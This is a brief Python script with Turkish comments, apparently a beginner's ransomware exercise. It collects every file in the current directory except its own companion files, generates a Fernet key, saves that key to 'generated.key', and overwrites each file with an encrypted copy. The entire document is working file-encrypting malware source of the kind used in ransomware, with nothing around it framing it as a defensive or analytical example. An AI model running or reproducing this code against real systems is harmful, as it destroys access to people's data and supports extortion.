import os
from cryptography.fernet import Fernet

#dosyaları listelemek
#print(os.listdir())

files = []
#dosya olan ve ransom olanı almasın
for file in os.listdir():
    if file == "ransom.py" or file == "generated.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

#python fernet
key = Fernet.generate_key()

print(key)

#oluşan keyi genrated.key dosyasına koyacağız wb:write binary rb:read
with open("generated.key","wb") as generatedkey:
    generatedkey.write(key)

#bu keyi kulanarak şifreleme

#dosyaları tek tek alıp okuyoruz
for file in files:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    # içeriği okuyup key ile şifreliyoruz
    contends_encrypted = Fernet(key).encrypt(contents)
    #dosyayı tekrar açtık ve içine şifrelenmiş halini yazdık
    with open(file,"wb") as the_file:
        the_file.write(contends_encrypted)


